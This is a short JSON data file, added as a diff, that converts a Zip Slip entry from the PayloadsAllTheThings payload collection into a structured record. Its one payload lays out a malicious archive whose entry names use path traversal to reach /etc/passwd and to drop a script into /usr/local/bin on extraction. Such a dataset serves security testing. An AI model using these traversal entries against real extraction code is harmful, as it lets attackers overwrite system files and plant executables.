@@ -1,0 +1,17 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "zip_slip",
+  "original_category": "Zip Slip",
+  "payloads": [
+    {
+      "category": "Methodology",
+      "escalation": "baseline",
+      "lines": [
+        "malicious.zip",
+        "├── ../../../../etc/passwd",
+        "├── ../../../../usr/local/bin/malicious_script.sh"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.867Z"
+}
